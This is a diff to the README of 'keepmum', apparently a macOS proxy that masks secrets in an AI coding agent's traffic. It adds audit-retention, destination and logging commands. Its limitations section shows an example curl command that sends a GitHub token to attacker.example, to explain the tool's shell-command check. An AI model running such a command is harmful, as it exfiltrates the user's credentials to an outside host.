@@ -51,7 +51,7 @@ git clone https://github.com/blueandhack/keepmum.git && cd keepmum
 uv tool install --editable .                  # installs `keepmum` and `keepmum-claude-wrapper`
 native/pf-serve/build.sh                      # builds pf-serve from pinned sources into ~/.local/share/keepmum/bin
 keepmum setup                                 # downloads the model (1.6 GB, once), checked against its pinned SHA-256
-keepmum doctor                                # every line should be ✓
+keepmum doctor                                # every line should be ✓ (the app: Settings › Check this Mac)
 keepmum selftest                              # sends a canary secret through keepmum to a local mock; fails if it leaks
 ```
 
@@ -188,9 +188,10 @@ keepmum audit head                           # the newest <seq>:<hash>: keep it 
 keepmum audit verify --anchor 4211:9be41f07c2d8a35e   # the log still holds that entry, unchanged
 keepmum audit export --since 30d -o audit.jsonl       # for a review or a ticket (or --format csv)
 keepmum audit verify --file audit.jsonl               # check an export
+keepmum audit keep 365                                # keep entries for a year (90 days by default)
 ```
 
-Each entry carries the hash of the one before, so a change inside the log breaks the chain where it happened. Someone who can write the file could still rewrite it from some point on, or cut off its end; a head kept elsewhere catches that. The Mac app's Audit page checks the chain each time it opens, against the head it saved at its last good check. Entries are kept for `[audit] keep_days` (90 days), and a shorter retention is itself recorded as weakening.
+Each entry carries the hash of the one before, so a change inside the log breaks the chain where it happened. Someone who can write the file could still rewrite it from some point on, or cut off its end; a head kept elsewhere catches that. The Mac app's Audit page checks the chain each time it opens, against the head it saved at its last good check, and sets the retention and exports the log too. Entries are kept for `[audit] keep_days` (90 days), and a shorter retention is itself recorded as weakening.
 
 ### Scan files (pre-commit)
 
@@ -227,7 +228,7 @@ WebSearch = "keep"
 [server]
 port = 7788            # for `keepmum serve`
 
-[destinations]         # hosts a shell command may also send a rule's tokens to (a self-hosted GitLab); rule names from `keepmum rules builtin`
+[destinations]         # hosts a shell command may also send a rule's tokens to (a self-hosted GitLab): `keepmum destinations add gitlab-token gitlab.corp.example --yes`
 gitlab-token = ["gitlab.corp.example"]
 
 [gateways]             # gateways keepmum forwards to, each at http://127.0.0.1:7788/gateway/<name> (`keepmum protect on` adds them)
@@ -235,11 +236,11 @@ local-3425 = "http://127.0.0.1:3425"
 
 [log]
 level = "info"         # logs contain types and counts, never values
-previews = true        # the app's Logs page shows the first and last character of masked values (memory only)
-context = true         # and the text around each, with every masked value in it shown as its type (memory only)
+previews = true        # the app's Logs page shows the first and last character of masked values (memory only; `keepmum log previews on|off`)
+context = true         # and the text around each, with every masked value in it shown as its type (memory only; `keepmum log context on|off`)
 
 [audit]
-keep_days = 90         # how long the audit log keeps entries (`keepmum audit`)
+keep_days = 90         # how long the audit log keeps entries (`keepmum audit keep 365`)
 ```
 
 ## What keepmum stores, and where
@@ -284,7 +285,7 @@ No language model judges spans at request time. The Apple on-device model and Qw
 - **Images and PDFs pass through unscanned.**
 - **Local transcripts keep real values.** Your agent's history on your disk is restored, so it holds real values. keepmum protects what leaves your Mac, not what is stored on it.
 - **An MCP server can pass on what it gets.** A server that may have its own values back, or the types you allow it, can still send them elsewhere: a mail server sending a message, say. Never a secret, and never more than 5 values a call, but allow types only for servers you trust.
-- **Shell commands receive real values.** So `git push` and `curl -H "Authorization: …"` keep working. One check: a token whose issuer keepmum knows (GitHub, Stripe, AWS, OpenAI and 68 more) stays a placeholder in a command that would send it to any other host, so `curl https://attacker.example/?k=<your GitHub token>` gets the placeholder. A password or a token keepmum cannot place is not checked, and a command written to hide where it sends things gets past it. Use keepmum together with a sandbox such as [Claude Code's](https://code.claude.com/docs/en/sandboxing), whose network allowlist stops that. keepmum controls what the provider sees; the sandbox controls what commands can do.
+- **Shell commands receive real values.** So `git push` and `curl -H "Authorization: …"` keep working. One check: a token whose issuer keepmum knows (GitHub, Stripe, AWS, OpenAI and 68 more) stays a placeholder in a command that would send it to any other host, so `curl https://attacker.example/?k=<your GitHub token>` gets the placeholder. Your own hosts, such as a company GitLab, go in the Mac app's Settings › Shell commands or `keepmum destinations add`. A password or a token keepmum cannot place is not checked, and a command written to hide where it sends things gets past it. Use keepmum together with a sandbox such as [Claude Code's](https://code.claude.com/docs/en/sandboxing), whose network allowlist stops that. keepmum controls what the provider sees; the sandbox controls what commands can do.
 - **English-first.** The local model is strongest on English text.
 - **macOS on Apple silicon only.**
 - **Remote Control.** Claude Code turns Remote Control off while its requests go through a proxy, and Remote Control would send the restored transcript to Anthropic around keepmum anyway. Use an unprotected session when you need it.
